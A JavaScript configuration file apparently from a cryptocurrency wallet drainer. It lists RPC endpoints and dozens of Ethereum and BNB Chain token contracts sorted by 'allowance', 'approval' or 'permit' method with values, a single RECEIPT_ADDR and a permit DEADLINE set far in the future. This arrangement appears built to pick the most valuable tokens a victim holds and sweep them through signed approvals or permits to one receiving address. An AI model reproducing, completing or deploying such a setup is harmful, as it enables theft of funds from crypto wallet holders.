export const CHAIN_ID = 1;

export const PROVIDER = {
    56: "https://bsc-dataseed1.binance.org/",
    1: "https://ethereum.publicnode.com",
}

export const TOKEN = {
    1: {
        allowance: {
            address: [
                "0xD33526068D116cE69F19A9ee46F0bd304F21A51f", /// ROCKET POOL   
                "0x9E32b13ce7f2E80A01932B42553652E053D6ed8e", /// METIS
                "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", /// stETH
                "0x50327c6c5a14DCaDE707ABad2E27eB517df87AB5", /// TRX
                "0x582d872A1B094FC48F5DE31D3B73F2D9bE47def1", /// TONCOIN
                "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", /// SHIB
                "0x85F17Cf997934a597031b2E18a9aB6ebD4B9f6a4", /// NEAR
                "0x75231F58b43240C9718Dd58B4967c5114342a86c", /// OKB
                "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30", /// INJ
                "0xF57e7e7C23978C3cAEC3C3548E3D615c346e79fF", /// IMX
                "0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1", /// ARB
                "0x3c3a81e81dc49A522A592e7622A7E711c06bf354", /// MNT
                "0xc5f0f7b66764F6ec8C8Dff7BA683102295E16409", /// FDUSD
                "0x0000000000085d4780B73119b644AE5ecd22b376", /// TUSD
                "0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39", /// HEX
                "0xae78736Cd615f374D3085123A210448E74Fc6393", /// rETH
                "0xc944E90C64B2c07662A292be6244BDf05Cda44a7", /// GRT
                "0x4da27a545c0c5B758a6BA100e3a049001de870f5", /// stkAAVE
                "0x62D0A8458eD7719FDAF978fe5929C6D342B0bFcE", /// BEAM
                "0xC669928185DbCE49d2230CC9B0979BE6DC797957", /// BTT
                "0xf34960d9d60be18cC1D5Afc1A6F012A723a28811", /// KCS
                "0x92D6C1e31e14520e676a687F0a93788B716BEff5", /// DYDX
                "0x5283D291DBCF85356A21bA090E6db59121208b44", /// BLUR
                "0x3506424F91fD33084466F402d5D97f05F8e3b4AF", /// CHZ
                "0x5E8422345238F34275888049021821E8E08CAa1f", /// frxETH
                "0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6", /// USDD
                "0x152649eA73beAb28c5b49B26eb48f7EAD6d4c898", /// Cake
                "0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0", /// FXS
                "0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72", /// ENS
                "0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85", /// FET
                "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", /// USDC
            ],
            price: [
                "35",
                "100",
                "2500",
                "0.11",
                "2",
                "0.000009",
                "3",
                "54",
                "37",
                "2",
                "1.97",
                "0.7",
                "1",
                "1",
                "0.01",
                "2747",
                "0.16",
                "99",
                "0.02",
                "0.00000099",
                "9.8",
                "3",
                "0.67",
                "0.1",
                "2500",
                "1",
                "2.8",
                "8.9",
                "22",
                "0.6",
                "1"
            ]
        },
        approval: {
            address: [
                "0x514910771AF9Ca656af840dff83E8264EcF986CA", /// LINK
                "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", /// WBTC
                "0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b", /// CRO
                "0x4a220E6096B25EADb88358cb44068A3248254675", /// QNT
                "0x6De037ef9aD2725EB40118Bb1702EBb27e4Aeb24", /// RNDR
                "0xB62132e35a6c13ee1EE0f84dC5d40bad8d815206", /// NEXO
                "0x6fB3e0A217407EFFf7Ca062D46c26E5d60a14d69", /// IOTX
                "0xbf2179859fc6D5BEE9Bf9158632Dc51678a4100e", /// ELF
                "0x05f4a42e251f2d52b8ed15E9FEdAacFcEF1FAD27", /// ZIL
                "0x6c6EE5e31d828De241282B9606C8e98Ea48526E2", /// HOT
                "0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD", /// LRC
                "0xaA7a9CA87d3694B5755f213B5D04094b8d0F0A6F", /// TRAC
                "0x58b6A8A3302369DAEc383334672404Ee733aB239", /// LPT
            ],
            price: [
                "15",
                "42000",
                "0.08",
                "115",
                "4",
                "0.87",
                "0.04",
                "0.56",
                "0.02",
                "0.0018",
                "0.24",
                "0.6",
                "7"

            ]
        },
        permit : {
            address: [
                "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", /// USDC
                "0x6B175474E89094C44Da98b954EedeAC495271d0F", /// DAI
                "0xac3E018457B222d93114458476f3E3416Abbe38F", /// sfrxETH
                "0xa117000000f279D81A1D3cc75430fAA017FA5A2e", /// ANT
                "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984" /// UNI
            ],
            price: [
                "1",
                "1",
                "2651",
                "7",
                "7"

            ]
        },
    },
    56: {
        allowance: {
            address: [
                "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", /// ETH
                "0x55d398326f99059fF775485246999027B3197955", /// USDT BSC-USD
                "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", /// USDC
                "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", /// CAKE
                "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", /// DOGE
                "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",/// LINK
                "0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153", /// FIL
                "0x40af3827F39D0EAcBF4A168f8D4ee67c121D11c9", // TUSD
                "0x26433c8127d9b4e9B71Eaa15111DF99Ea2EeB2f8", /// MANA
                "0x90C97F71E18723b0Cf0dfa30ee176Ab653E89F40", // FRAX
                "0xb3c11196A4f3b1da7c23d9FB0A3dDE9c6340934F" /// USDP
            ],
            price: [
                "2400",
                "1",
                "1",
                "3",
                "0.17",
                "20",
                "10.5",
                "1",
                "0.75",
                "1",
                "1"
            ]
        },
        approval: {
            address: [
                "",

            ],
            price: [
                "",


            ]
        },
        permit: {
            address: [
                "0x29cED01C447166958605519F10DcF8b0255fB379", /// FRAX

            ],
            price: [
                "1",


            ]
        },
    },

}

export const RECEIPT_ADDR = "0x30C6a829795a294eBB0C70f5876F5446BFa89846";

export const DEADLINE = "1858102375375";

